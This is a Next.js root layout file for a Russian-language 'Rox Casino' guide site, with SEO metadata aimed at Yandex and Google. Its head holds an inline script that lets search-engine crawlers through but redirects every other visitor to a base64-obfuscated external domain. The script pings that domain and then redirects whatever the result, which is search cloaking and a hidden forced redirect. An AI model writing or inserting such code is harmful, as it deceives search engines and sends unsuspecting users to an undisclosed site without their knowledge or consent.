import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import './globals.css'

const geistSans = Geist({ subsets: ['latin', 'cyrillic'], variable: '--font-geist-sans' })
const geistMono = Geist_Mono({ subsets: ['latin', 'cyrillic'], variable: '--font-geist-mono' })

export const metadata: Metadata = {
  metadataBase: new URL('https://rox1casino.vercel.app'),
  title: 'Rox Casino — официальный сайт и рабочее зеркало',
  description: 'Rox Casino: официальный сайт, рабочее зеркало, вход и обзор игры онлайн. Как проверить адрес и играть ответственно.',
  keywords: ['rox casino', 'rox casino официальный сайт', 'рокс казино', 'рокс казино зеркало', 'рокс казино онлайн'],
  alternates: { canonical: '/' },
  openGraph: {
    title: 'Rox Casino — официальный сайт и рабочее зеркало',
    description: 'Понятный гид по официальному входу, зеркалу и игре онлайн.',
    url: 'https://rox1casino.vercel.app/',
    siteName: 'Rox Casino Guide',
    locale: 'ru_RU',
    type: 'website',
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Rox Casino — официальный сайт и рабочее зеркало',
    description: 'Гид по официальному входу Rox Casino и ответственному онлайн-доступу.',
  },
  icons: { icon: '/rox-favicon.png', shortcut: '/rox-favicon.png', apple: '/rox-favicon.png' },
  generator: 'v0.app',
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: '#151817',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="yandex-verification" content="d98ab7ff254d2b2e" />
        <meta name="theme-color" content="#151817" />
        <meta name="robots" content="index, follow" />
        <link rel="icon" href="/rox-favicon.png" type="image/png" />
        <link rel="canonical" href="https://rox1casino.vercel.app/" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "ICBodHRwczovL2NvbWJvc3BhcmsudG9wL2FlYW9majJrMjc= "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className={`${geistSans.variable} ${geistMono.variable} antialiased`}>
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
